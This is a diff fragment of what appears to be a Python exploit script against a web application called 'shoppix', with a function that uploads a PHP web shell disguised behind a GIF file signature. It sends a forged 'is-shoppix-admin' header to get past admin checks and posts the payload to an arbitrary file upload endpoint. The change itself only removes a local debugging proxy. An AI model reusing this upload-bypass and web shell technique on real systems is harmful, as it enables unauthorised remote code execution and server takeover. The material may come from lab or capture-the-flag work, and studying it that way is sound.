@@ -339,7 +339,7 @@ def uploadPhpFile(filename, phpCode):
     fileContentByte = BytesIO(f'{GIF_FILE_SIGNATURE}\n{webshellPayload}'.encode())
     file = {'image': (filename, fileContentByte)}
     header = { 'is-shoppix-admin': 'true' }
-    response = requests.post(ARBITRARY_FILE_UPLOAD_ENDPOINT, files=file, headers=header, proxies={'http': 'http://localhost:8080'})
+    response = requests.post(ARBITRARY_FILE_UPLOAD_ENDPOINT, files=file, headers=header)
     if response.status_code != 200:
         print('[-] Failed to upload the file')
         exit()
